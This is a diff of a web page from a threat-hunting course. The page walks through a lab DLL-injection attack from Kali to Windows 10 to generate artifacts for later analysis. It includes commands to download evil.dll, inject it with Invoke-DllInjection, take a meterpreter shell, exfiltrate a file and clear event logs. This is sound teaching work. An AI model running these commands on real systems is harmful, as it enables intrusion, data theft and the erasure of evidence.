@@ -2,12 +2,12 @@
 <html><head lang="en">
 	<meta charset="utf-8" />
 	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Section 2: Performing the Attack - faan|ross</title><link rel="icon" type="image/x-icon" href=/favicon.ico /><meta name="viewport" content="width=device-width, initial-scale=1">
-	<meta name="description" content="| Return to Course Overview | Proceed to Section 3 |
+	<meta name="description" content="| Course Overview | Return to Section 1 | Proceed to Section 3 |
 2. Performing the Attack 2.1. Introduction Why are we performing the attack ourselves? Why didn&rsquo;t I just do it, export all the requisite artifacts, and share this with you? Why am I making you go through this rigmarole - is it simply that I am cruel?
 Nah. The reason is pretty simple - I have a deep sense of conviction that one can only truly &ldquo;get&rdquo; defense if you equally &ldquo;get&rdquo; offense." />
 	<meta property="og:image" content=""/>
 	<meta property="og:title" content="Section 2: Performing the Attack" />
-<meta property="og:description" content="| Return to Course Overview | Proceed to Section 3 |
+<meta property="og:description" content="| Course Overview | Return to Section 1 | Proceed to Section 3 |
 2. Performing the Attack 2.1. Introduction Why are we performing the attack ourselves? Why didn&rsquo;t I just do it, export all the requisite artifacts, and share this with you? Why am I making you go through this rigmarole - is it simply that I am cruel?
 Nah. The reason is pretty simple - I have a deep sense of conviction that one can only truly &ldquo;get&rdquo; defense if you equally &ldquo;get&rdquo; offense." />
 <meta property="og:type" content="article" />
@@ -16,7 +16,7 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 <meta property="article:modified_time" content="2023-08-12T02:01:58+05:30" />
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Section 2: Performing the Attack"/>
-<meta name="twitter:description" content="| Return to Course Overview | Proceed to Section 3 |
+<meta name="twitter:description" content="| Course Overview | Return to Section 1 | Proceed to Section 3 |
 2. Performing the Attack 2.1. Introduction Why are we performing the attack ourselves? Why didn&rsquo;t I just do it, export all the requisite artifacts, and share this with you? Why am I making you go through this rigmarole - is it simply that I am cruel?
 Nah. The reason is pretty simple - I have a deep sense of conviction that one can only truly &ldquo;get&rdquo; defense if you equally &ldquo;get&rdquo; offense."/>
 <script src="https://athul.github.io/archie/js/feather.min.js"></script>
@@ -26,7 +26,7 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 	
 
 	
-	<link rel="stylesheet" type="text/css" media="screen" href="https://athul.github.io/archie/css/main.dd96be82687f2a3c48a68b1615119f516a61deee410fb50de65cb93d7e921d09.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://athul.github.io/archie/css/main.f5968f615e691145516af7beb94a05127c7b7d0e93ab337bd09b02bbfdd01e78.css" />
 		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://athul.github.io/archie/css/dark.191767dd42068cd77e23d5f95ccc0becc0e7105decd65e1405e5695f242e2b3c.css"   />
 	
 
@@ -101,26 +101,27 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 		
 
 		<section class="body">
-			<p><code>|</code> <a href="https://www.faanross.com/posts/course01/">Return to Course Overview</a> <code>|</code> <a href="https://www.faanross.com/course01/03_live_native/">Proceed to Section 3</a> <code>|</code></p>
+			<p><code>|</code> <a href="https://www.faanross.com/posts/course01/">Course Overview</a> <code>|</code> <a href="https://www.faanross.com/course01/01_settingup">Return to Section 1</a> <code>|</code> <a href="https://www.faanross.com/course01/03_live_native/">Proceed to Section 3</a> <code>|</code></p>
 <hr>
 <p> </p>
+<figure class="custom-figure"><img src="/img/gif/otter.gif"/>
+</figure>
+
 <h1 id="2-performing-the-attack">2. Performing the Attack</h1>
 <h1 id="21-introduction">2.1. Introduction</h1>
 <p>Why are we performing the attack ourselves? Why didn&rsquo;t I just do it, export all the requisite artifacts, and share this with you? Why am I making you go through this rigmarole - is it simply that I am cruel?</p>
-<figure class="custom-figure"><img src="/img/cruel.gif"/>
-</figure>
-
 <p>Nah. The reason is pretty simple - I have a deep sense of conviction that one can only truly &ldquo;get&rdquo; defense if you equally &ldquo;get&rdquo; offense. If I just black box that entire process and give you the data, then once we start hunting everything is abstract. The commands we ran, the files we used, the techniques we employed etc are all just ideas.So then, when you learn to threat hunt these artifacts that exists solely as ideas it&rsquo;ll mostly be memorization - if X happens then I do Y.</p>
 <p>But, if instead you do the attack first and learn by doing it yourself, it does not exist as an abstract idea but as a concrete experience. I think then when you perform the threat hunt, because you have a connection to these things you are hunting, well then you learn less through memorization and more through understanding.</p>
-<figure class="custom-figure-3"><img src="/img/cereal.gif"/>
+<figure class="custom-figure-6"><img src="/img/gif/cereal.gif"/>
 </figure>
 
 <p>So let&rsquo;s jump into a bit of theory that will help us understand just what we are getting up to once we perform the actual attack, which will follow immediately afterwards.</p>
 <hr>
+<p> </p>
 <h1 id="22-theory">2.2. Theory</h1>
 <h1 id="221-what-is-a-dll">2.2.1. What is a DLL?</h1>
 <p>A DLL is a file containing shared code. It&rsquo;s not a program or an executable in and of itself, rather a DLL is in essence a collection of functions and data that can be used by other programs. Hence the name being Dynamic Link <em><strong>Library</strong></em>.</p>
-<figure class="custom-figure-3"><img src="/img/library.gif"/>
+<figure class="custom-figure-8"><img src="/img/gif/library.gif"/>
 </figure>
 
 <p>So think of a DLL as a virtual communal resource: suppose you have 4 programs running and they all want to use a common function - let&rsquo;s say for the sake of simplicity the ability to minimize the gui window. Now instead of each of those programs having their own personal copy of the function that allows that, they&rsquo;ll instead access a DLL that contains the function to minimize gui windows instead.</p>
@@ -129,26 +130,26 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 <h1 id="222-what-is-a-dll-injection-attack">2.2.2. What is a DLL-Injection Attack?</h1>
 <p>So keeping what I just mentioned in mind - that any running program is accessing a variety of code from various DLLs at any time - what then is a DLL-injection attack? Well in a normal environment we have legit programs accessing code from legit DLLs.</p>
 <p>With a DLL-injection attack an attacker enters into the population of legitimate DLLs a malicious one, that is a DLL that contains the code the attacker wants executed. Once the malicious DLL is ready, the attacker then basically tricks a legitimate app into loading it into its memory space and then executing it. Thus a DLL injection is a way to get another program to run your code, instead of creating a program specifically to do so.</p>
-<figure class="custom-figure"><img src="/img/trick.gif"/>
+<figure class="custom-figure"><img src="/img/gif/trick.gif"/>
 </figure>
 
 <p>Threat actors love injecting DLLs for two main reasons. First, injected code runs with the same privileges as the legitimate process - meaning potentially elevated. Second, doing so makes it, in general, harder to detect. There&rsquo;s no longer an opportunity to find a &ldquo;smoking gun&rdquo; .exe file, rather to find anything malicious we need to peer beneath the processes at an arguably more convoluted level of abstraction.</p>
-<figure class="custom-figure-3"><img src="/img/invisible.gif"/>
+<figure class="custom-figure-8"><img src="/img/gif/invisible.gif"/>
 </figure>
 
 <p>So that&rsquo;s DLL injection in a nutshell, but what then is <em>standard</em> DLL-injection? Well there are a few ways in which to achieve the process I described above, of which standard is one such way. What distinguishes it is that the malicious DLL is first written to the victim&rsquo;s disk before being injected. This can obviously be considered a design flaw since it will create residual IOCs on the disk which, compared to memory, is non-ephemeral.</p>
 <p>As a side-note: the thus logical evolutionary improvement on standard DLL-injections are <em>reflective loading</em> DLL-injections. Instead of writing the malicious DLL to disk, they inject it directly into memory thereby increasing the volatility of any evidence. But hold that thought until our next course, where we&rsquo;ll be covering it.</p>
-<figure class="custom-figure-2"><img src="/img/hold.gif"/>
+<figure class="custom-figure-6"><img src="/img/gif/hold.gif"/>
 </figure>
 
 <h1 id="223-what-is-a-command-and-control-c2-stager-server-and-payload">2.2.3. What is a Command and Control (C2) Stager, Server, and Payload?</h1>
 <p>Let&rsquo;s start by sketching a scenario of how a typical attack might play out in 2023. An attacker sends a spear-phishing email to an employee at a company. The employee, perhaps tired and not paying full attention, opens the so-called <em>&ldquo;urgent invoice&rdquo;</em> attached to the malicious email.</p>
-<figure class="custom-figure"><img src="/img/drevil.gif"/>
+<figure class="custom-figure"><img src="/img/gif/drevil.gif"/>
 </figure>
 
 <p>Opening this attachment executes a tiny program called a <code>stager</code>. A stager, though not inherently malicious, &ldquo;sets the stage&rdquo; by typically performing one specific task. Once launched the stager will reach out to a designated address (often a web server owned by the hacker) to download + execute another piece of code.</p>
 <p>This new code, depending on its exact <em>modus operandi</em>, goes by a few names: most commonly its referred to as a <code>payload</code> or <code>implant</code>. And briefly: the reason this stepped method is utilized instead of simply attaching the payload directly to the email is to avoid detection. Not only then is the initial attachment much smaller (since its a simple script with a single function), but it also does not contain any malicious code, thereby reducing the probability of generating an alert.</p>
-<figure class="custom-figure"><img src="/img/beavis.gif"/>
+<figure class="custom-figure"><img src="/img/gif/beavis.gif"/>
 </figure>
 
 <p>So the employee opened an attachment to an email, which launched a stager, which in turn downloaded a payload. This payload now will connect back to the attacker&rsquo;s system to establish a connection to the victim&rsquo;s system. But it not only creates the connection, but also serves as a &ldquo;gateway&rdquo;. That&rsquo;s to say it allows the attacker to execute commands on the victim&rsquo;s system from their own. And this system, the one the attacker uses to execute commands on that of the victim, is what we call the <code>C2 Server</code>.</p>
@@ -158,9 +159,10 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 <p><a href="https://www.youtube.com/watch?v=lz2ARbZ_5tE">In-memory Evasion - Detections | Raphael Mudge</a></p>
 <p><a href="https://www.youtube.com/watch?v=ihElrBBJQo8">Advanced Attack Detection | William Burgess +  Matt Wakins</a></p>
 <hr>
+<p> </p>
 <h1 id="23-attack">2.3. ATTACK!</h1>
 <p>Finally! The time has come to give it our best shot&hellip;</p>
-<figure class="custom-figure"><img src="/img/attack_kip.gif"/>
+<figure class="custom-figure"><img src="/img/gif/attack_kip.gif"/>
 </figure>
 
 <h1 id="231-getting-the-ips">2.3.1. Getting the IPs</h1>
@@ -168,25 +170,25 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 <li>Fire up both your Windows 10 and Kali VMs.</li>
 <li>On our Kali VM - open a terminal and run <code>ip a</code> so we can see what the ip address is. Write this down, we&rsquo;ll be using it a few times during the generation of our stager and handler. You can see mine below is <strong>192.168.230.155</strong> NOTE: Yours will be different!</li>
 </ol>
-<figure class="custom-figure"><img src="/img/image032.png"/>
+<figure class="custom-figure"><img src="/img/course01/image032.png"/>
 </figure>
 
 <ol start="3">
 <li>Now go to the Windows VM. Open an administrative PowerShell terminal. Run <code>ipconfig</code> so we also have the ip of the victim - write this down.</li>
 </ol>
-<figure class="custom-figure-3"><img src="/img/image033.png"/>
+<figure class="custom-figure-8"><img src="/img/course01/image033.png"/>
 </figure>
 
 <ol start="4">
 <li>And now, though it&rsquo;s not really required, I like to ping the Kali VM from this same terminal just to make sure the two VMs are connecting to one another on the local network. Obviously if this fails you will have to go back and troubleshoot.</li>
 </ol>
-<figure class="custom-figure-3"><img src="/img/image034.png"/>
+<figure class="custom-figure-8"><img src="/img/course01/image034.png"/>
 </figure>
 
 <ol start="5">
 <li>Next we&rsquo;ll create a simple text file on the victim&rsquo;s desktop which will basically emulate the &ldquo;nuclear codes&rdquo; the threat actor is after. Right-click on the desktop, <code>New</code> &gt; <code>Text document</code>, give it a name and add some generic content.</li>
 </ol>
-<figure class="custom-figure-3"><img src="/img/image035.png"/>
+<figure class="custom-figure-8"><img src="/img/course01/image035.png"/>
 </figure>
 
 <h1 id="232-generate--transfer-stager">2.3.2. Generate + Transfer Stager</h1>
@@ -206,32 +208,32 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 </li>
 <li>Below you can see what successful output looks like.</li>
 </ul>
-<figure class="custom-figure"><img src="/img/image037.png"/>
+<figure class="custom-figure"><img src="/img/course01/image037.png"/>
 </figure>
 
 <ol start="3">
 <li>Next we want to transfer our malicious DLL over to the victim. There are a myriad ways in which you can achieve this, so feel free to follow my example, or use any other technique you prefer. Still on our Kali VM navigate to the directory where you saved your payload, in my case this is on the desktop. We&rsquo;ll now create a simple http server with Python. Again <code>8008</code> represents an arbitrary port, feel free to choose something else</li>
 </ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 -m http.server 8008
-</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image038.png"/>
+</span></span></code></pre></div><figure class="custom-figure"><img src="/img/course01/image038.png"/>
 </figure>
 
 <ol start="4">
 <li>Now we&rsquo;ll head over to the victim&rsquo;s system, we can either run a powershell command to download the file (<code>Invoke-WebRequest -Uri &quot;http://192.168.230.155:8008/evil.dll&quot; -OutFile &quot;evil.dll&quot; </code>), or simply open the browser (Edge) and type in the address bar  <code>http://IP of hacker:port of http server</code>, for example:</li>
 </ol>
-<figure class="custom-figure-2"><img src="/img/image039.png"/>
+<figure class="custom-figure-8"><img src="/img/course01/image039.png"/>
 </figure>
 
 <ol start="5">
 <li>As you can see in the image above, you should see the dll file. If you don&rsquo;t, you either did not generate it, OR most likely you are not running the http server from the same directory. Now simply right-click on the DLL, <code>Save link as</code>, and in my case I will save it to desktop. Note that Edge may block the download, for example:</li>
 </ol>
-<figure class="custom-figure-2"><img src="/img/image040.png"/>
+<figure class="custom-figure-8"><img src="/img/course01/image040.png"/>
 </figure>
 
 <ul>
 <li>If this is the case, click on the three dots <code>...</code> to the right of this message (More actions), and select <code>Keep</code>. You&rsquo;ll be confronted with another warning, select <code>Show more</code>, then <code>Keep anyway</code>.</li>
 </ul>
-<figure class="custom-figure-2"><img src="/img/image042.png"/>
+<figure class="custom-figure-8"><img src="/img/course01/image042.png"/>
 </figure>
 
 <ul>
@@ -250,13 +252,13 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 </ul>
 </li>
 </ol>
-<figure class="custom-figure"><img src="/img/image043.png"/>
+<figure class="custom-figure"><img src="/img/course01/image043.png"/>
 </figure>
 
 <ol start="7">
 <li>We now need to set required parameters, to see which ones are required run <code>show options</code>.</li>
 </ol>
-<figure class="custom-figure"><img src="/img/image044.png"/>
+<figure class="custom-figure"><img src="/img/course01/image044.png"/>
 </figure>
 
 <ul>
@@ -270,13 +272,13 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 </ul>
 </li>
 </ol>
-<figure class="custom-figure-3"><img src="/img/image045.png"/>
+<figure class="custom-figure-6"><img src="/img/course01/image045.png"/>
 </figure>
 
 <ol start="9">
 <li>Now to start the listener we can use one of two commands, there&rsquo;s literally no difference. You can either use <code>run</code>, or <code>exploit</code>.</li>
 </ol>
-<figure class="custom-figure-3"><img src="/img/image046.png"/>
+<figure class="custom-figure-6"><img src="/img/course01/image046.png"/>
 </figure>
 
 <ul>
@@ -285,7 +287,7 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 <h1 id="233-hit-the-record-button">2.3.3. Hit The Record Button</h1>
 <p>Alright, since we are now literally about to pull the trigger, let&rsquo;s hit the record button.</p>
 <p>First off we want to start capturing our packet capture using <code>WireShark</code>. In the search bar write <code>WireShark</code> and open it. Under <code>Capture</code> you will see the available interfaces, in my case the one we want is called <code>Ethernet0</code> - yours may or may not have the same name. How do you know which is the correct one? Look at the little graphs next to the names, only one should have little spikes representing actual network traffic, the rest are likely all flat. It&rsquo;s the active one, ie the one with traffic, we want - see image below.Once you&rsquo;ve identified it, simply double-click on it, this then starts the recording.</p>
-<figure class="custom-figure-3"><img src="/img/image036.png"/>
+<figure class="custom-figure-6"><img src="/img/course01/image036.png"/>
 </figure>
 
 <p>One other thing, right before we start our attack I also want to clear both logs we activated - <code>Sysmon</code> and <code>PowerShell ScriptBlock</code>. You see since we&rsquo;ve enabled it, it&rsquo;s likely recorded a bunch of events completely irrelevant to our interest here. So we&rsquo;ll clear them and start anew so our final capture is spared all this noise.</p>
@@ -294,14 +296,14 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wevtutil cl &#34;Microsoft-Windows-PowerShell/Operational&#34;
 </span></span></code></pre></div><h1 id="234-preparing-our-injection-script">2.3.4. Preparing Our Injection Script</h1>
 <p>First, we need to perform a bit of <em>Macgyvering</em>&hellip;</p>
-<figure class="custom-figure"><img src="/img/macgyver.gif"/>
+<figure class="custom-figure"><img src="/img/gif/macgyver.gif"/>
 </figure>
 
 <p>Above in <code>2.3.2</code> we created the malicious DLL (<code>evil.dll</code>). But of course, now we need a script to actually inject the DLL into a running process. One of the most popular scripts to do perform this is called <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1">Invoke-DllInjection.ps1</a> from the <a href="https://github.com/PowerShellMafia/PowerSploit">PowerShell Mafia</a>.</p>
 <p>The code as it currently stands on the original repo is however broken, at least when I tried it using multiple configurations. The script has not been updated in a few years, and since it&rsquo;s also been archived it&rsquo;s unlikely it ever will be - the original authors have since moved on to bigger things.</p>
 <p>The good news though is I found a simple fix and have updated the script which is now being hosted on <a href="https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1">my github repo here</a>.</p>
 <p>And so, just so you are aware, we are going to download and inject into memory the script directly from my personal Github repo but <code>in no way whatsoever do I want to appear as taking any credit/ownership for it</code>.</p>
-<figure class="custom-figure"><img src="/img/notmine.gif"/>
+<figure class="custom-figure"><img src="/img/gif/notmine.gif"/>
 </figure>
 
 <p>The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to <a href="https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1">refer to them</a> if you want.</p>
@@ -314,14 +316,14 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 </span></span></code></pre></div><ul>
 <li>Note that after you run it there won&rsquo;t be any feedback/output. You see, PowerShell is rather stoic -  not receiving any feedback/output almost always means the command ran successfully. Conversely, if there was an error, you&rsquo;ll get some red text telling you what went wrong.</li>
 </ul>
-<figure class="custom-figure"><img src="/img/stoic.gif"/>
+<figure class="custom-figure"><img src="/img/gif/stoic.gif"/>
 </figure>
 
 <h1 id="235-injecting-our-malicious-dll">2.3.5. Injecting Our Malicious DLL</h1>
 <p>Great so the script that will inject <code>evil.dll</code> into a process memory space is now in memory. But to be clear: though we&rsquo;ve injected that script into memory, we&rsquo;ve not yet executed it.</p>
 <p>We&rsquo;re about to do so, but before that there&rsquo;s one more thing we need. Remember in the beginning when I explained how DLL-injections work I said that we &ldquo;trick&rdquo; a legit process into running code from a malicious DLL? So this script we just injected into memory is what&rsquo;s going to be doing the trickery, we also have our malicious DLL which we transferred over, so that means we only need one more thing - a legit process.</p>
 <p>Now it used to be the case that you could easily inject into any process, including native Windows processes like notepad and calculator. You&rsquo;ll notice if you do some older tutorials, they&rsquo;ll almost always choose one of these two as the example. However, this has become more complicated since Windows 10 since native applications will only load <a href="https://security.stackexchange.com/questions/197409/why-doesnt-dll-injection-works-on-windows-10-for-native-windows-binaries-e-g">MS-signed libraries</a>.</p>
-<figure class="custom-figure"><img src="/img/charlie.gif"/>
+<figure class="custom-figure"><img src="/img/gif/charlie.gif"/>
 </figure>
 
 <p>Though there are ways to circumvent this let&rsquo;s not overcomplicate things right now in this regard. Plus, it&rsquo;s not really all that unrealistic to expect a non-native Windows executable to be running on a victim&rsquo;s system, so I&rsquo;ll be running a random executable called <code>rufus.exe</code>. It&rsquo;s a small, simple program that creates bootable usb drives, but that&rsquo;s irrelevant - I really just arbitrarily chose it to have <em>some</em> non-MS process.</p>
@@ -335,34 +337,34 @@ Nah. The reason is pretty simple - I have a deep sense of conviction that one ca
 <p>We need to find the Process ID (PID) of <code>rufus.exe</code> since we&rsquo;ll pass that as an argument to our injection script. You can either run Task Manager from the gui, or here I&rsquo;ll be running <code>ps</code> in PowerShell. And we can see here the PID is 784.</p>
 </li>
 </ol>
-<figure class="custom-figure"><img src="/img/image048.png"/>
+<figure class="custom-figure"><img src="/img/course01/image048.png"/>
 </figure>
 
 <ol start="3">
 <li>And now all the pieces are in place so we can run our command. We can note that we provide it two things, first the PID of the legit process we want to inject into, and the path to the DLL we want to be injected. So run the command in the same administrative PowerShell terminal.</li>
 </ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Invoke-DllInjection -ProcessID 784 -Dll C:\Users\User\Desktop\evil.dll
-</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image049.png"/>
+</span></span></code></pre></div><figure class="custom-figure"><img src="/img/course01/image049.png"/>
 </figure>
 
 <ol start="4">
 <li>We see some output, now to know if it worked let&rsquo;s head on back to our Kali VM. We can immediately see that we received the connection and are now in a <code>meterpreter</code> shell - success!</li>
 </ol>
-<figure class="custom-figure"><img src="/img/popped_shell.gif"/>
+<figure class="custom-figure"><img src="/img/gif/popped_shell.gif"/>
 </figure>
 
-<figure class="custom-figure"><img src="/img/image050.png"/>
+<figure class="custom-figure"><img src="/img/course01/image050.png"/>
 </figure>
 
 <ol start="5">
 <li>We can run a few commands if we&rsquo;d like, also we&rsquo;ll exfiltrate the &ldquo;nuclear launch codes&rdquo; we created in the beginning.</li>
 </ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>download C:\\Users\\user\\Desktop\\tob_seekrit.txt /home/hacker/Desktop/
-</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image051.png"/>
+</span></span></code></pre></div><figure class="custom-figure"><img src="/img/course01/image051.png"/>
 </figure>
 
 <p>Additionally, we can also drop into a <code>shell</code>.</p>
-<figure class="custom-figure-3"><img src="/img/image052.png"/>
+<figure class="custom-figure-6"><img src="/img/course01/image052.png"/>
 </figure>
 
 <p>That&rsquo;s it for our attack!</p>
@@ -390,20 +392,21 @@ And finally we&rsquo;ll dump the memory for our post-mortem analysis:</p>
 </ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>winpmem.exe memdump.raw
 </span></span></code></pre></div><hr>
+<p> </p>
 <h1 id="24-shenanigans-a-honest-review-of-our-attack">2.4. Shenanigans! A (honest) review of our attack</h1>
 <p>OK so let&rsquo;s just hold zoom out and discuss the attack we just performed. At this point, if you have your wits about you, you might, and rightfully so I&rsquo;ll add, be calling <strong>shenanigans</strong> on me.</p>
-<figure class="custom-figure-3"><img src="/img/shenanigans.gif"/>
+<figure class="custom-figure-6"><img src="/img/gif/shenanigans.gif"/>
 </figure>
 
 <p>&ldquo;Wait&rdquo;, I hear you say, &ldquo;if the whole point of infecting the victim and getting C2 control established is so that we can run commands on it, isn&rsquo;t it cheating then to be running these commands ahead of that actually happening&rdquo;?</p>
 <p>Look at the meta: the whole point of establishing C2 on the victim is so we can run commands on it, but we literally just allowed ourselves to freely run commands on the victim so that we can establish C2. We wrote our malicious DLL to disk, injected our DLL-injection script into memory, and ran the script all from the comfort of Imaginationland.</p>
-<figure class="custom-figure-3"><img src="/img/imagination.gif"/>
+<figure class="custom-figure-6"><img src="/img/gif/imagination.gif"/>
 </figure>
 
 <p>So then the answer is <em>yes</em>. That was cheating - of course. But, it&rsquo;s cheating with a purpose you see, the purpose here being that this is a course on threat hunting. So we stripped the actions of the initial compromise down to its core and for now we&rsquo;ve foregone our spearfishing email and VBA macro. We&rsquo;ve streamlined the essence of the attack - we&rsquo;re expending less energy in the effort, and yet for our intents have created the same outcome.</p>
 <p>So, we won&rsquo;t be investing our time in completely recreating a realistic simulation of the intial compromise, <em>however</em>, I do think it&rsquo;s very important for us to discuss here what that would look like. We are about to embark on our threat hunt, which is an investigation; but there would be no value for us to go attempting to discover things that exists only because of our specific &ldquo;cheating&rdquo; method here.</p>
 <p>Meaning: I want to make sure you understand which parts of the attack we just performed are representative of an actual attack, and which are not. The reason for this of course is so we can focus on what really matters - ie that which we expect to see following a real-life attack.</p>
-<figure class="custom-figure-3"><img src="/img/focus.gif"/>
+<figure class="custom-figure-6"><img src="/img/gif/focus.gif"/>
 </figure>
 
 <p>So the remainder of this section will be dedicated to that. I&rsquo;m very briefly going to review all the main beats to the attack we just performed, thereafter I&rsquo;ll &ldquo;translate&rdquo; the actions to a representative real-world counterpart, pointing out specifically which elements we expect to see in an actual attack, and which we don&rsquo;t.</p>
@@ -421,7 +424,7 @@ And finally we&rsquo;ll dump the memory for our post-mortem analysis:</p>
 <li>We ran a simple command in the new shell (whoami).</li>
 <li>We closed the connection.</li>
 </ol>
-<figure class="custom-figure"><img src="/img/dementors.gif"/>
+<figure class="custom-figure"><img src="/img/gif/dementors.gif"/>
 </figure>
 
 <p><strong>OK. Now let&rsquo;s review what an actual attack might have looked like:</strong></p>
@@ -441,16 +444,14 @@ And finally we&rsquo;ll dump the memory for our post-mortem analysis:</p>
 </ol>
 <p>I hope this helps you understand how our attack lead to the same outcomes, but just followed another path to get there in the interest of ease and efficiency.</p>
 <p>There is one final thing I want to address, another thing that, if you&rsquo;re paying attention you might be wondering why exactly we did this? If you take a moment to think about it, the initial VBA macro might as well simply just called back to the handler to establish a connection directly. This would have bypassed numerous steps (download + save dll, download + inject script, invoke script), each which represent a potential point of failure or detection. So why go through all this extra effort to get to the same result - a backdoor connection?</p>
-<figure class="custom-figure-3"><img src="/img/ninja.gif"/>
+<figure class="custom-figure-8"><img src="/img/gif/ninja.gif"/>
 </figure>
 
 <p>The reason to go through these steps rather than just having the initial script call back to the handler is all about stealth. Yes our process might involve increased risk, but the end result is a connection mediated by an injected DLL and not an executable, which in general will be harder to detect. So again, this game is all about trade-offs: this process accepts a relatively higher degree of risk during the process of establishing itself on the victim&rsquo;s system, however once established it operates with a relatively lower degree of risk.</p>
 <p>Ok friends, thanks for entertaining this little side quest. I do so consciously with the full intent of ensuring you understand the why as much as the how. For now however let&rsquo;s move onto the first phase of our actual threat hunt - live analysis using native windows tools.</p>
 <hr>
-<hr>
 <p> </p>
-<hr>
-<p><code>|</code> <a href="https://www.faanross.com/posts/course01/">Return to Course Overview</a> <code>|</code> <a href="https://www.faanross.com/course01/03_live_native/">Proceed to Section 3</a> <code>|</code></p>
+<p><code>|</code> <a href="https://www.faanross.com/posts/course01/">Course Overview</a> <code>|</code> <a href="https://www.faanross.com/course01/01_settingup">Return to Section 1</a> <code>|</code> <a href="https://www.faanross.com/course01/03_live_native/">Proceed to Section 3</a> <code>|</code></p>
 
 		</section>
 
